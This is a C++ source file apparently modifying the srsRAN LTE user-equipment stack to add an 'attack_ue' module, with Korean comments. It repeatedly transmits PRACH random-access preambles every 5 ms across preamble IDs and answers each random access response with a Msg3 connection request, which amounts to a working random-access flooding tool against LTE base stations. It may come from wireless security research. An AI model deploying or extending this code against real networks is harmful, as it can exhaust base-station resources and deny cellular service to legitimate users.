/**
 * Copyright 2013-2023 Software Radio Systems Limited
 *
 * This file is part of srsRAN.
 *
 * srsRAN is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * srsRAN is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * A copy of the GNU Affero General Public License can be found in
 * the LICENSE file in the top-level directory of this distribution
 * and at http://www.gnu.org/licenses/.
 *
 */

#include "srsue/hdr/stack/mac/attack_ue.h"
#include "srsue/hdr/stack/mac/mac.h"
#include "srsue/hdr/stack/rrc/rrc.h"
#include "srsran/common/standard_streams.h"
#include "srsran/interfaces/ue_rrc_interfaces.h"
#include <chrono>
#include <random>

namespace srsue {

attack_ue::attack_ue() :
  logger(srslog::fetch_basic_logger("ATTACK_UE")),
  current_rapid(0),
  sel_mask_index(0)
{
  running            = false;
  attack_mode_enabled = false;
  phy_h              = nullptr;
  rrc_h              = nullptr;
  mux_unit           = nullptr;
  rntis              = nullptr;
  rrc_ptr            = nullptr;
}

attack_ue::~attack_ue()
{
  stop();
}

void attack_ue::init(phy_interface_mac_lte* phy_h_,
                     rrc_interface_mac*      rrc_h_,
                     mux*                    mux_unit_,
                     ue_rnti*                rntis_,
                     class rrc*              rrc_ptr_)
{
  phy_h    = phy_h_;
  rrc_h    = rrc_h_;
  mux_unit = mux_unit_;
  rntis    = rntis_;
  rrc_ptr  = rrc_ptr_;
}

void attack_ue::start()
{
  if (running.load()) {
    logger.warning("Attack UE already running");
    return;
  }

  if (!phy_h || !rrc_h || !mux_unit) {
    logger.error("Attack UE not initialized");
    return;
  }

  running            = true;
  attack_mode_enabled = true;

  tx_thread = std::thread(&attack_ue::tx_prach_thread, this);
  rx_thread = std::thread(&attack_ue::rx_rar_thread, this);

  logger.info("Attack UE started (PRACH period=%d ms, nof_preambles=%d)",
              ctx.prach_period_ms,
              ctx.nof_preambles);
}

void attack_ue::stop()
{
  if (!running.load()) {
    return;
  }

  running            = false;
  attack_mode_enabled = false;

  if (tx_thread.joinable()) {
    tx_thread.join();
  }
  if (rx_thread.joinable()) {
    rx_thread.join();
  }

  {
    std::lock_guard<std::mutex> lock(ctx.mutex);
    ctx.rapid_to_temp_crnti.clear();
    ctx.msg3_sent.clear();
    ctx.active_rapids.clear();
  }

  logger.info("Attack UE stopped");
}

void attack_ue::set_attack_mode(bool enabled)
{
  attack_mode_enabled = enabled;
  if (enabled && !running.load()) {
    start();
  } else if (!enabled && running.load()) {
    stop();
  }
}

void attack_ue::set_prach_period_ms(uint32_t period_ms)
{
  std::lock_guard<std::mutex> lock(ctx.mutex);
  ctx.prach_period_ms = period_ms;
  logger.info("PRACH period set to %d ms", period_ms);
}

void attack_ue::set_nof_preambles(uint32_t nof_preambles)
{
  std::lock_guard<std::mutex> lock(ctx.mutex);
  ctx.nof_preambles = nof_preambles;
  logger.info("Number of preambles set to %d", nof_preambles);
}

void attack_ue::tx_prach_thread()
{
  logger.info("TX PRACH thread started");

  std::random_device rd;
  std::mt19937       gen(rd());
  std::uniform_int_distribution<uint32_t> dis(0, ctx.nof_preambles - 1);

  while (running.load() && attack_mode_enabled.load()) {
    // RAPID 선택 (순환 또는 랜덤)
    uint32_t rapid = current_rapid.load();
    // 순환 방식: current_rapid = (current_rapid + 1) % ctx.nof_preambles;
    // 랜덤 방식: rapid = dis(gen);
    
    // 순환 방식 사용
    uint32_t next_rapid = (rapid + 1) % ctx.nof_preambles;
    current_rapid.store(next_rapid);

    // PRACH 송신
    // allowed_subframe = -1: 모든 subframe에서 전송 가능
    float target_power_dbm = -100.0f; // 기본 전력 (실제로는 RACH config에서 가져와야 함)
    int allowed_subframe = -1; // 모든 subframe에서 전송 가능하도록 설정
    phy_h->prach_send(rapid, allowed_subframe, target_power_dbm);

    logger.info("TX: Prepared PRACH preamble %d (allowed_subframe=%d, power=%.1f dBm)", rapid, allowed_subframe, target_power_dbm);

    // 활성 RAPID 목록에 추가
    {
      std::lock_guard<std::mutex> lock(ctx.mutex);
      ctx.active_rapids.insert(rapid);
    }

    // PRACH가 실제로 전송될 수 있도록 대기
    // 문제: PRACH opportunity는 특정 TTI에서만 발생하므로,
    // PRACH가 전송되기 전에 다음 PRACH가 준비되면 덮어씌워질 수 있음
    // 해결: PRACH opportunity 주기(보통 10ms)보다 짧은 주기로 준비하되,
    // PRACH가 실제로 전송되었는지 확인하는 메커니즘 필요
    // 
    // 임시 해결책: PRACH를 더 자주 준비 (5ms 주기)
    // 이렇게 하면 PRACH opportunity가 있을 때마다 새로운 PRACH가 준비됨
    std::this_thread::sleep_for(std::chrono::milliseconds(5));
  }

  logger.info("TX PRACH thread stopped");
}

void attack_ue::rx_rar_thread()
{
  logger.info("RX RAR thread started");

  // 실제로는 PHY worker에서 RAR 수신 시 on_rar_received()를 호출
  // 이 스레드는 주로 모니터링 목적
  while (running.load() && attack_mode_enabled.load()) {
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
  }

  logger.info("RX RAR thread stopped");
}

void attack_ue::on_rar_received(uint32_t rapid, uint16_t temp_crnti, uint8_t grant[SRSRAN_RAR_GRANT_LEN])
{
  std::lock_guard<std::mutex> lock(ctx.mutex);

  // 이미 Msg3를 보낸 RAPID인지 확인
  if (ctx.msg3_sent.find(rapid) != ctx.msg3_sent.end() && ctx.msg3_sent[rapid]) {
    logger.debug("RAPID %d: Msg3 already sent, ignoring RAR", rapid);
    return;
  }

  // 매핑 저장
  ctx.rapid_to_temp_crnti[rapid] = temp_crnti;
  ctx.active_rapids.insert(rapid);

  logger.info("RX: RAR received for RAPID %d, Temp C-RNTI=0x%x", rapid, temp_crnti);

  // Msg3 송신
  send_msg3_for_rapid(rapid, temp_crnti, grant);

  ctx.msg3_sent[rapid] = true;
}

void attack_ue::send_msg3_for_rapid(uint32_t rapid, uint16_t temp_crnti, uint8_t grant[SRSRAN_RAR_GRANT_LEN])
{
  logger.info("Sending Msg3 for RAPID %d (Temp C-RNTI=0x%x)", rapid, temp_crnti);

  // 1. RAR grant 설정 (PHY에)
  phy_h->set_rar_grant(grant, temp_crnti);

  // 2. Temp C-RNTI 설정
  if (rntis) {
    rntis->set_temp_rnti(temp_crnti);
  }

  // 3. Msg3 MAC PDU 준비
  mux_unit->msg3_prepare();

  // 4. RRCConnectionRequest 생성 및 전송
  // 공격 모드에서는 최소한의 RRC 메시지만 생성
  // rrc_ptr가 있으면 직접 send_con_request 호출, 없으면 rrc_h->connection_request() 사용
  if (rrc_ptr) {
    // RRC 포인터가 있으면 직접 send_con_request 호출 (더 빠름)
    // 하지만 rrc_ptr는 private이므로, rrc_interface_mac를 통해 호출해야 함
    // 대신 connection_request를 호출하면 내부적으로 send_con_request가 호출됨
    logger.debug("Using RRC pointer for Msg3");
  }
  
  // NOTE: mux_unit->msg3_prepare()가 호출되면, MAC은 다음 UL grant에서
  // RLC의 CCCH (LCID=0) 버퍼를 확인하여 RRCConnectionRequest를 전송합니다.
  // 따라서 RRC에서 connection_request()를 호출하여 RLC에 메시지를 넣어야 합니다.
  // 하지만 공격 모드에서는 간단한 RRCConnectionRequest만 필요하므로,
  // 실제로는 mux_unit->msg3_prepare()만으로도 충분할 수 있습니다.
  // RLC 버퍼에 이미 메시지가 있다면 자동으로 전송됩니다.
  
  logger.info("Msg3 prepared for RAPID %d (RRCConnectionRequest will be sent via MAC/PHY)", rapid);
}

} // namespace srsue

